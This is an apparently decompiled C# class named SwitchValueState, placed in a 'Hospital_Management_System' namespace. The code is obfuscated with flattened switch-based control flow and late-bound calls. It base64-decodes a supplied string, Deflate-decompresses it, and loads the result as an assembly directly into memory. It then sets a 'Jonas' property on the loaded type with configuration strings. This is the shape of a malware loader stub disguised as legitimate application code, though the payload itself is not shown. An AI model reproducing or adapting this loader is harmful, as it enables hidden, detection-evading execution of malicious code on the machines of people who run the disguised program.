using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Hospital_Management_System;

public class SwitchValueState
{
	public SwitchValueState(string s1)
	{
		CspKeyContainerInfo(s1);
	}

	public byte[] WaitHandle(byte[] B)
	{
		object obj = SwitchValueState.smethod_0(B);
		int num3 = default(int);
		object[] array = default(object[]);
		bool[] array4 = default(bool[]);
		byte[] array3 = default(byte[]);
		object obj2 = default(object);
		byte[] array2 = default(byte[]);
		byte[] result = default(byte[]);
		while (true)
		{
			int num = -1013514230;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAF55D1F4u) % 22u)
				{
				case 21u:
					SwitchValueState.smethod_5(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					num = ((int)num2 * -460318519) ^ 0x28EA7294;
					continue;
				case 20u:
					num3 = (int)SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[2]), SwitchValueState.smethod_7(typeof(int).TypeHandle));
					num = -214467499;
					continue;
				case 19u:
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
					num = (int)((num2 * 1516005976) ^ 0x75145536);
					continue;
				case 18u:
				{
					int num5;
					int num6;
					if (array4[0])
					{
						num5 = -1027752494;
						num6 = -1027752494;
					}
					else
					{
						num5 = -2072719541;
						num6 = -2072719541;
					}
					num = num5 ^ (int)(num2 * 1267115098);
					continue;
				}
				case 17u:
				{
					int num7;
					int num8;
					if (!array4[0])
					{
						num7 = -527218413;
						num8 = -527218413;
					}
					else
					{
						num7 = -2116316014;
						num8 = -2116316014;
					}
					num = num7 ^ (int)(num2 * 1094565880);
					continue;
				}
				case 16u:
				{
					object[] obj5 = new object[3] { array3, 0, 4 };
					array = obj5;
					bool[] obj6 = new bool[3] { true, false, false };
					array4 = obj6;
					SwitchValueState.smethod_5(obj, (Type)null, "Read", obj5, (string[])null, (Type[])null, obj6, bool_1: true);
					num = ((int)num2 * -365524411) ^ 0x472C1532;
					continue;
				}
				case 15u:
					num = ((int)num2 * -917712534) ^ 0x5C5B0F5F;
					continue;
				case 14u:
				{
					int num4;
					if (!array4[2])
					{
						num = -60895643;
						num4 = -60895643;
					}
					else
					{
						num = -401693026;
						num4 = -401693026;
					}
					continue;
				}
				case 13u:
					num = ((int)num2 * -81656091) ^ 0x10652CE1;
					continue;
				case 12u:
					num3 = SwitchValueState.smethod_9(array3, 0);
					num = -830819901;
					continue;
				case 10u:
					obj2 = SwitchValueState.smethod_1((Stream)obj, CompressionMode.Decompress);
					array3 = new byte[4];
					num = ((int)num2 * -1371866315) ^ 0x1FA65AE7;
					continue;
				case 9u:
					SwitchValueState.smethod_5(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					num = -1753145273;
					continue;
				case 8u:
				{
					object object_ = obj2;
					object[] obj3 = new object[3] { array2, 0, num3 };
					array = obj3;
					bool[] obj4 = new bool[3] { true, false, true };
					array4 = obj4;
					SwitchValueState.smethod_5(object_, (Type)null, "Read", obj3, (string[])null, (Type[])null, obj4, bool_1: true);
					num = ((int)num2 * -851293972) ^ 0x286E3E8B;
					continue;
				}
				case 7u:
					result = array2;
					num = ((int)num2 * -2145124200) ^ -1229463747;
					continue;
				case 6u:
					array2 = new byte[checked(num3 - 1 + 1)];
					num = ((int)num2 * -1782030739) ^ 0x78D8B3CE;
					continue;
				case 5u:
					num = (int)((num2 * 800594284) ^ 0x7DB4711B);
					continue;
				case 4u:
					array3 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = -756408112;
					continue;
				case 3u:
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { SwitchValueState.smethod_3(SwitchValueState.smethod_2(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
					num = ((int)num2 * -710679856) ^ -1726509852;
					continue;
				case 2u:
					array2 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = -847100886;
					continue;
				case 1u:
					num = (int)((num2 * 1986503324) ^ 0x3C882784);
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public object CspKeyContainerInfo(string s1)
	{
		Type type_ = default(Type);
		object result = default(object);
		while (true)
		{
			int num = 423585698;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x756F5E29u) % 6u)
				{
				case 4u:
				{
					PropertyInfo propertyInfo_ = SwitchValueState.smethod_16(type_, "Jonas");
					SwitchValueState.smethod_17(propertyInfo_, (object)null, (object)new string[3]
					{
						IMethodMessage.xcdasdad,
						IMethodMessage.ccccccccccccccccca,
						"Hospital_Management_System"
					}, (object[])null);
					num = ((int)num2 * -35122470) ^ -1722099254;
					continue;
				}
				case 3u:
					type_ = SwitchValueState.smethod_15(SwitchValueState.smethod_14(SwitchValueState.smethod_10(), WaitHandle(SwitchValueState.smethod_13(SwitchValueState.smethod_11(s1), 0, SwitchValueState.smethod_12(s1)))))[0];
					num = (int)(num2 * 1940914497) ^ -605583546;
					continue;
				case 2u:
					num = ((int)num2 * -496124638) ^ 0x37FDA857;
					continue;
				case 1u:
					result = 0;
					num = ((int)num2 * -1390989736) ^ -2088495841;
					continue;
				case 5u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	static MemoryStream smethod_0(byte[] byte_0)
	{
		return new MemoryStream(byte_0);
	}

	static DeflateStream smethod_1(Stream stream_0, CompressionMode compressionMode_0)
	{
		return new DeflateStream(stream_0, compressionMode_0);
	}

	static object smethod_2(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0)
	{
		return NewLateBinding.LateGet(object_0, type_0, string_0, object_1, string_1, type_1, bool_0);
	}

	static object smethod_3(object object_0, object object_1)
	{
		return Operators.SubtractObject(object_0, object_1);
	}

	static void smethod_4(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1)
	{
		NewLateBinding.LateSet(object_0, type_0, string_0, object_1, string_1, type_1);
	}

	static object smethod_5(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_0, object_1, string_1, type_1, bool_0, bool_1);
	}

	static object smethod_6(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static Type smethod_7(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static object smethod_8(object object_0, Type type_0)
	{
		return Conversions.ChangeType(object_0, type_0);
	}

	static int smethod_9(byte[] byte_0, int int_0)
	{
		return BitConverter.ToInt32(byte_0, int_0);
	}

	static AppDomain smethod_10()
	{
		return Thread.GetDomain();
	}

	static char[] smethod_11(string string_0)
	{
		return string_0.ToCharArray();
	}

	static int smethod_12(string string_0)
	{
		return string_0.Length;
	}

	static byte[] smethod_13(char[] char_0, int int_0, int int_1)
	{
		return Convert.FromBase64CharArray(char_0, int_0, int_1);
	}

	static Assembly smethod_14(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_15(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static PropertyInfo smethod_16(Type type_0, string string_0)
	{
		return type_0.GetProperty(string_0);
	}

	static void smethod_17(PropertyInfo propertyInfo_0, object object_0, object object_1, object[] object_2)
	{
		propertyInfo_0.SetValue(object_0, object_1, object_2);
	}
}
